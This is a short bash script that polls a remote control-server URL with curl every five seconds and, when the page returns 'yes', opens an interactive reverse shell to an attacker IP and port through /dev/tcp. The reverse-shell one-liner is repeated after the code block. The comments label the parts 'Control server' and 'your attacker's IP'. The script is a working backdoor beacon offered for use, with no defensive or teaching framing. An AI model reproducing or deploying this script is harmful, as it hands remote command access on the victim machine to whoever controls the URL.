```
#!/bin/bash
URL="https://rasenrhino.github.io/static/reverse.html"  # Control server
SHELL_HOST="172.25.0.2"                      # Replace with your attacker's IP
SHELL_PORT=4242 # Port your listener is using
# Loop to check the control server
while true; do
    response=$(curl -s "$URL")
    echo $response
    if [[ "$response" == "yes" ]]; then
        echo "starting revshell"
        bash -i >& /dev/tcp/$SHELL_HOST/$SHELL_PORT 0>&1
    fi
    sleep 5
done
```
 bash -i >& /dev/tcp/172.25.0.2/4242 0>&1